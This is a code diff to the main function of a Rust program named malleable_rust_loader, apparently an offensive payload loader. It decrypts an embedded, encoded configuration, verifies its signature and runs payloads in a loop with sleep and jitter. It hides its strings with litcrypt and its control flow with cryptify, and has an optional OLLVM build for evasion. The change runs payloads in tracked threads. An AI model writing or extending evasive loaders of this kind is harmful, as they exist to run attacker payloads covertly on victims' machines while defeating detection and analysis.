@@ -1,6 +1,6 @@
 use malleable_rust_loader::config::Config;
 //use malleable_rust_loader::link::LinkFetch;
-use std::{thread, time};
+use std::thread;
 
 #[macro_use]
 extern crate litcrypt;
@@ -8,11 +8,12 @@ use_litcrypt!();
 
 use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
 use malleable_rust_loader::dataoperation::DataOperation;
+use malleable_rust_loader::payload::Payload;
+use malleable_rust_loader::payload_util::print_running_thread;
 
 use log::debug;
 use log::error;
 use log::info;
-//use log::warn;
 extern crate env_logger;
 use cryptify;
 
@@ -24,7 +25,7 @@ const INITIAL_LOADER : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable
 #[cfg(not(feature="ollvm"))]
 const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead.dataop.rot13b64"));
 
-// ------ OLLVM compilation from a docker
+// ------ OLLVM compilation from docker
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
 const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aead");
@@ -39,7 +40,6 @@ fn main() {
     cryptify::flow_stmt!();
     let loader_conf_encrypted = INITIAL_LOADER.to_vec();
     let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
-    debug!("{}", lc!("[+] OPEN dataoperation"));
     let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
     let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
     let dataoperation: Vec<DataOperation> =
@@ -56,6 +56,7 @@ fn main() {
     config.verify_newloader_sign(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
+    let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
     let mut loop_nb = 1;
     loop {
         info!(
@@ -66,7 +67,6 @@ fn main() {
         );
         info!("{}{:?}", lc!("[+] Active LOADER: "), config);
         config.print_loader_without_sign_material();
-        config.sleep_and_jitt();
 
         info!("{}", lc!("[+] DEFUSE UPDATE config"));
         if config.stop_defuse(&config.defuse_update) {
@@ -79,10 +79,13 @@ fn main() {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
             } else {
                 info!("{}", lc!("[+] PAYLOADS exec"));
-                config.exec_payloads();
+                config.exec_payloads(&mut running_thread);
             }
         }
 
+        print_running_thread(&mut running_thread);
+        //TODO wait all thread to finish -> new option
+        config.sleep_and_jitt();
         info!(
             "{}{}{}{}",
             lc!("[+] END LOOP "),
@@ -91,8 +94,6 @@ fn main() {
             "\n"
         );
 
-        let sleep_time = time::Duration::from_millis(1000);
-        thread::sleep(sleep_time);
         loop_nb = loop_nb + 1;
     }
 }
